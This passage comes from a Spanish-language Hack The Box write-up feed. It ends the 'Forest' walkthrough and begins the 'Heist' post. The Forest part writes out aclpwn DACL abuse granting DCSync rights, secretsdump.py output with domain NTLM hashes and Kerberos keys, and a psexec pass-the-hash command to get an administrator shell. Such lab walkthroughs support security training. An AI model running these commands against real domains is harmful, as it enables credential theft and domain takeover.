Please choose a path &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0-1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Path validated, the following modifications are required &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; exploitation in the current configuration:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Adding user SVC-ALFRESCO to group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Modifying domain DACL to give DCSync rights to SVC-ALFRESCO
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2022.23.11.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@kali:~/tools/impacket/examples# aclpwn -f svc-alfresco -ft user -t htb.local -tt domain -d htb.local -du neo4j -dp toor -s 10.10.10.161
Please supply the password or LM:NTLM hashes of the account you are escalating from: 
[+] Path found!
Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-&amp;gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-&amp;gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-&amp;gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-&amp;gt;(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]-&amp;gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-&amp;gt;(HTB.LOCAL)
[!] Unsupported operation: GetChanges on HTB.LOCAL (Domain)
[-] Invalid path, skipping
[+] Path found!
Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]-&amp;gt;(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]-&amp;gt;(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]-&amp;gt;(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]-&amp;gt;(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]-&amp;gt;(HTB.LOCAL)
Please choose a path [0-1] 1
[-] Memberof -&amp;gt; continue
[-] Memberof -&amp;gt; continue
[-] Memberof -&amp;gt; continue
[-] Adding user SVC-ALFRESCO to group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
[+] Added CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local as member to CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
[-] Re-binding to LDAP to refresh group memberships of SVC-ALFRESCO@HTB.LOCAL
[+] Re-bind successful
[-] Modifying domain DACL to give DCSync rights to SVC-ALFRESCO
[+] Dacl modification successful
[+] Finished running tasks
[+] Saved restore state to aclpwn-20191130-014547.restore
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-30%2000.46.34.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora que que tenemos permisos DCSync podemos utilizar secretsdump.py para obtener los hash de los usuarios.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/tools/impacket# secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
Impacket v0.9.21-dev - Copyright &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping Domain Credentials &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;id:rid:lmhash:nthash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Using the DRSUAPI method to get NTDS.DIT secrets
htb.local&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;ucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ndy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;anti:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:179967e72ed1faea7d8de2f3c2b5d003:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ebastien:des-cbc-md5:702a3445e0d65b58
htb.local&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;ucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;ucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;ucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ndy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ndy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ndy:des-cbc-md5:a2ab5eef017fb9da
htb.local&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;ark:des-cbc-md5:b5dff1f40b8f3be9
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;anti:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;anti:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;anti:des-cbc-md5:4075ad528ab9e5fd
FOREST$:aes256-cts-hmac-sha1-96:d409d743b2d787ba4a45692058388533840bb55a4d1fd65f8e345164d2df5078
FOREST$:aes128-cts-hmac-sha1-96:c7306933e272b5b5992f9c9ff688eaa2
FOREST$:des-cbc-md5:c8132fbf73c71fa8
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Cleaning up... 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2022.26.41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener los hashes de la mayoria de usuarios, podemos obtener el de un solo usuario, en este caso el que nos interesa es el del usuario administrator.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/tools/impacket# secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -just-dc-user administrator
Impacket v0.9.21-dev - Copyright &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping Domain Credentials &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;id:rid:lmhash:nthash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Using the DRSUAPI method to get NTDS.DIT secrets
htb.local&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Cleaning up...
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2022.28.01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos psexec.py para obtener nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt; y una shell.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rlwrap psexec.py htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-30%2000.43.32.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/forest/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/forest/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>enum4linux</category>
            
          
            
              <category>kerberos</category>
            
          
            
              <category>smbmap</category>
            
          
            
              <category>impacket</category>
            
          
            
              <category>evil-winrm</category>
            
          
            
              <category>bloodhound</category>
            
          
            
              <category>aclpwn</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>windows</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Heist</title>
        <link>https://sckull.github.io/posts/heist/</link>
        <pubDate>Sat, 30 Nov 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 30 Nov 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/heist/</guid>
        <description>Inicialmente se muestra un fichero en la pagina web el cual contiene credenciales cisco encriptadas, con ellas pudimos enumerar algunos usuarios con Impacket y con WinRM obtener acceso.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Inicialmente se muestra un fichero en la pagina web el cual contiene credenciales cisco encriptadas, con ellas pudimos enumerar algunos usuarios con Impacket y con WinRM obtener acceso. Enumerando los archivos de la pagina inicial encontramos el hash del Adminstrador el cual crackeamos y obtuvimos acceso privilegiado.&lt;/p&gt;
&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/201&#34;&gt;Heist&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.149&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/8308&#34;&gt;MinatoTW&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/8308&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[7.8, 7.2, 4.4, 5.6, 2.8],
